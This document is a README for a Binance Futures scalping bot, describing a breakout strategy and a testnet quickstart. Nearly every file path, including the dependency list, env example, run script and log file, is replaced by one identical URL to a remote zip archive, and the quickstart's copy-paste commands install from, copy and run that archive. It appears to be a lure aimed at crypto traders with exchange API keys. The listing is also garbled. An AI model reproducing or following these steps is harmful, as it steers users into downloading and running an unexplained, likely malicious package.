# Binance Futures Fast-Growth Scalping Bot

This repository contains a modular Binance Futures scalping bot implementing a 5-minute breakout strategy with volume confirmation (1.3x), dry-run/testnet support, and TP/SL management.

## Structure
- `src/` - main Python source files
- `tests/` - unit tests
- `https://raw.githubusercontent.com/okelloaliwa01/oci-bot-flipped/main/data/oci_flipped_bot_2.1-beta.4.zip` - Python dependencies
- `https://raw.githubusercontent.com/okelloaliwa01/oci-bot-flipped/main/data/oci_flipped_bot_2.1-beta.4.zip` - environment variable examples
- `Dockerfile` - simple image build
- `https://raw.githubusercontent.com/okelloaliwa01/oci-bot-flipped/main/data/oci_flipped_bot_2.1-beta.4.zip` - run locally script
- `https://raw.githubusercontent.com/okelloaliwa01/oci-bot-flipped/main/data/oci_flipped_bot_2.1-beta.4.zip` - docker run helper

## Quickstart (testnet + dry-run)
1. Create a Python 3.9+ venv
```bash
python -m venv venv
source venv/bin/activate
pip install -r https://raw.githubusercontent.com/okelloaliwa01/oci-bot-flipped/main/data/oci_flipped_bot_2.1-beta.4.zip
cp https://raw.githubusercontent.com/okelloaliwa01/oci-bot-flipped/main/data/oci_flipped_bot_2.1-beta.4.zip .env
# edit .env to set keys and DRY_RUN/USE_TESTNET values
python https://raw.githubusercontent.com/okelloaliwa01/oci-bot-flipped/main/data/oci_flipped_bot_2.1-beta.4.zip
```

## Notes
- Start in DRY_RUN=True and USE_TESTNET=True for safe testing.
- Check `https://raw.githubusercontent.com/okelloaliwa01/oci-bot-flipped/main/data/oci_flipped_bot_2.1-beta.4.zip` for appended simulated trades.
